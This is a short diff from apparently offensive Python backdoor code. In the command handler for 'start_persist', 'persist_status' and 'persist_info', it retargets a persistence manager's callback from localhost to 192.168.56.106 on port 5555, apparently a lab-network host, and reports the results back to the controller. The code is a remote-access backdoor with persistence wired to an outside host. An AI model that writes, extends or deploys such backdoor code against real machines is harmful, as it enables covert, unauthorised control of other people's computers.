@@ -274,7 +274,7 @@ def shell():
         elif command == 'start_persist':
             try:
                 if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                    persistence_manager = create_backdoor_persistence('192.168.56.106', 5555)
                 success, msg = persistence_manager.start_persistence_operations()
                 reliable_send("Persistence: " + msg)
             except Exception as e:
@@ -293,7 +293,7 @@ def shell():
         elif command == 'persist_status':
             try:
                 if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                    persistence_manager = create_backdoor_persistence('192.168.56.106', 5555)
                 status = persistence_manager.get_persistence_status()
                 reliable_send("Persistence Status: " + json.dumps(status, indent=2))
             except Exception as e:
@@ -302,7 +302,7 @@ def shell():
         elif command == 'persist_info':
             try:
                 if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('127.0.0.1', 5555)
+                    persistence_manager = create_backdoor_persistence('192.168.56.106', 5555)
                 connections = persistence_manager.get_connection_report()
                 reliable_send("Persistence Info: " + json.dumps(connections, indent=2))
             except Exception as e:
